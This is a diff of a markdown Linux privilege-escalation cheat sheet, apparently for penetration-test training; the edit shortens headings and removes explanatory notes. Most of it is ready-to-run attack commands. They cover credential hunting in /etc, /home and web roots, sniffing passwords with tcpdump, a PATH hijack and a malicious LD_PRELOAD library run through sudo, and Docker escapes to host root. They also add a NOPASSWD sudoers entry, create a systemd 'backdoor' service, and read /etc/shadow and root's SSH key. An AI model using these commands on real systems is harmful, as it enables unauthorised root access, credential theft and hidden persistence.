@@ -1,13 +1,11 @@
 # Stabilize Shell
-We often land with an unstable shell that makes further enumeration more difficult, so we should address it first.
 
-## Python Shell Stabilizer (1/2)
+## Stabilize shell part 1
 ```bash
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
-**Press CTRL+Z** to background the process, then run:
-## Python Shell Stabilizer (2/2)
+## Stabilize shell part 2
 ```bash
 stty raw -echo; fg; export TERM=xterm
 ```
@@ -18,9 +16,8 @@ stty raw -echo; fg; export TERM=xterm
 ```
 /usr/share/peass/linpeas/linpeas.sh
 ```
-on kali. Transfer to target and tee to output file.
 
-## LinEnum (GitHub Source)
+## LinEnum (Source)
 ```bash
 https://github.com/rebootuser/LinEnum
 ```
@@ -29,34 +26,35 @@ https://github.com/rebootuser/LinEnum
 ```
 /usr/share/linux-exploit-suggester
 ```
-## Unix-Privesc-Check (GitHub Source)
+
+## Unix-Privesc-Check (Source)
 ```
 https://github.com/pentestmonkey/unix-privesc-check
 ```
-## Run unix-privesc-check for automated enumeration
+
+## Run unix-privesc-check
 ```bash
 unix-privesc-check standard > output.txt
 ```
 
 
 # Manual Enumeration
-## Check current user and group memberships
+## Show current user
 ```bash
 id
 ```
 
-## List all system users
+## List system users
 ```bash
 cat /etc/passwd
 ```
-Is /etc/passwd writable? Create a new user or remote the 'x' from an existing user to effectively remove their password.
 
-## Display hostname
+## Show hostname
 ```bash
 hostname
 ```
 
-## Linux OS distribution and version
+## Show OS version
 ```bash
 cat /etc/issue
 cat /etc/os-release
@@ -65,24 +63,22 @@ cat /proc/version
 lsb_release -a
 ```
 
-## List all running processes
+## List running processes
 ```bash
 ps aux
 ```
 
-## Monitor processes with pspy (Source)
+## pspy (Source)
 ```
 https://github.com/DominicBreuker/pspy
 ```
-Transfer to target and run.
-Use `timeout 20 ./pspy64` to end after 20 seconds (otherwise can only exit with CTRL+C which will kill most reverse shells)
 
-## Watch for password-related processes
+## Watch for password processes
 ```bash
 watch -n 1 "ps -aux | grep pass"
 ```
 
-## Display network interfaces and IP addresses
+## Show network interfaces
 ```bash
 ip a
 ```
@@ -92,121 +88,115 @@ ip a
 ip route
 ```
 
-## List all network connections and listening ports
+## List network connections
 ```bash
 ss -antup
 ```
-Check for ports that are only accessible internally. They may run vulnerable services that can be abused for privilege escalation.
 
-## Check iptables firewall rules
+## Check iptables rules
 ```bash
 ls -la /etc/iptables
 iptables -L -n -v
 iptables-save
 ```
 
-## Capture network traffic for credentials
+## Capture network traffic
 ```bash
 tcpdump -i lo -A | grep "pass"
 tcpdump -i eth0 -A -s 0 'tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)'
 ```
 
-## List all cron job files
+## List cron files
 ```bash
 ls -lah /etc/cron*
 ```
 
-## Display system-wide crontab
+## Show system crontab
 ```bash
 cat /etc/crontab
 ```
 
-## List current user's cron jobs
+## List user cron jobs
 ```bash
 crontab -l
 sudo crontab -l
 ```
 
-## List cron jobs for all users
+## List all users cron jobs
 ```bash
 for user in $(cut -f1 -d: /etc/passwd); do echo "=== $user ==="; crontab -u $user -l 2>/dev/null; done
 ```
 
-## List installed packages on Debian-based systems
+## List packages Debian
 ```bash
 dpkg -l
 apt list --installed
 ```
 
-## List installed packages on RedHat-based systems
+## List packages RedHat
 ```bash
 rpm -qa
 yum list installed
 ```
 
 # Credential Hunting
-https://osintteam.blog/oscp-exam-success-10-must-know-commands-and-tools-every-pentester-should-master-4b514bf64ccd
 
-## Look in /, /opt, /tmp, /var for unusual files
-
-## grep /etc for "password"
+## grep etc for password
 ```
 grep -rni 'password' /etc 2>/dev/null
 ```
 
-## grep for Private Keys
+## grep for private keys
 ```
 grep -rni 'PRIVATE KEY' /home 2>/dev/null
 ```
 
-## grep webroot for "password"
+## grep webroot for password
 ```
 grep -Horn password /var/www
 ```
 
-## grep Credential Hunt /etc
+## grep etc for credentials
 ```
 grep -rni --color=always 'password\|secret\|key\|token' /etc 2>/dev/null
 ```
 
-## Find .bak,.zip,.tar.gz Backups and Archives
-Use zip2john and crack if applicable.
+## Find backup files
 ```
 find / -regextype posix-egrep -regex ".*\.(bak|zip|tar|gz)$"
 ```
-``
+
 ## Find nonempty directories
-Automated tools may miss unusual directories. Same time when `tree` isn't available.
 ```
 find . -type d ! -empty
 ```
 
-## Find all writable directories
+## Find writable directories
 ```bash
 find / -writable -type d 2>/dev/null
 ```
 
-## Find all SUID files
+## Find SUID files
 ```bash
 find / -perm -u=s -type f 2>/dev/null
 ```
 
-## Find all SGID files
+## Find SGID files
 ```bash
 find / -perm -g=s -type f 2>/dev/null
 ```
 
-## Find files with capabilities set
+## Find files with capabilities
 ```bash
 getcap -r / 2>/dev/null
 ```
 
-## Display filesystem mount table
+## Show fstab
 ```bash
 cat /etc/fstab
 ```
 
-## Show currently mounted filesystems
+## Show mounted filesystems
 ```bash
 mount
 df -h
@@ -217,13 +207,13 @@ df -h
 lsblk
 ```
 
-## List loaded kernel modules
+## List kernel modules
 ```bash
 lsmod
 /sbin/modinfo <module_name>
 ```
 
-## Display environment variables and PATH
+## Show environment variables
 ```bash
 echo $PATH
 env
@@ -236,24 +226,23 @@ cat ~/.bash_profile
 ```
 
 ## Check sudo permissions
-Check gtfobins for interesting entries.
 ```bash
 sudo -l
 ```
 
-## Exploit PATH hijacking with writable directory
+## PATH hijacking exploit
 ```bash
 echo '/bin/bash' > /tmp/ls
 chmod +x /tmp/ls
 export PATH=/tmp:$PATH
 ```
 
-## Check for LD_PRELOAD sudo permission
+## Check for LD_PRELOAD
 ```bash
 sudo -l | grep LD_PRELOAD
 ```
 
-## Create malicious shared library for LD_PRELOAD exploit
+## LD_PRELOAD exploit
 ```bash
 cat > /tmp/shell.c << 'EOF'
 #include <stdio.h>
@@ -270,7 +259,7 @@ gcc -fPIC -shared -o /tmp/shell.so /tmp/shell.c -nostartfiles
 sudo LD_PRELOAD=/tmp/shell.so apache2
 ```
 
-## Check bash history for credentials
+## Check bash history
 ```bash
 cat ~/.bash_history
 cat ~/.mysql_history
@@ -279,30 +268,30 @@ cat ~/.vim_history
 find /home -name ".*history" 2>/dev/null
 ```
 
-## Escape Docker container to host root
+## Docker escape to host
 ```bash
 docker run -v /:/mnt --rm -it alpine chroot /mnt sh
 docker run --rm -v /etc:/mnt/etc -it alpine vi /mnt/etc/passwd
 ```
 
-## Access MySQL as root and execute shell
+## MySQL shell escape
 ```bash
 mysql -u root -p
 \! /bin/bash
 ```
 
-## Check for MySQL UDF exploits
+## MySQL UDF exploits
 ```bash
 searchsploit mysql udf
 searchsploit -m 1518
 ```
 
-## Add user to sudoers file
+## Add user to sudoers
 ```bash
 echo "user ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
 ```
 
-## Create systemd backdoor service
+## Create systemd backdoor
 ```bash
 cat > /etc/systemd/system/backdoor.service << 'EOF'
 [Unit]
@@ -320,14 +309,14 @@ systemctl enable backdoor.service
 systemctl start backdoor.service
 ```
 
-## Search for readable sensitive files
+## Check sensitive files
 ```bash
 cat /etc/shadow 2>/dev/null
 cat /etc/sudoers 2>/dev/null
 cat /root/.ssh/id_rsa 2>/dev/null
 ```
 
-## Check common application config locations
+## Check application configs
 ```bash
 cat /var/www/html/config.php 2>/dev/null
 ls -la /etc/apache2/sites-enabled/
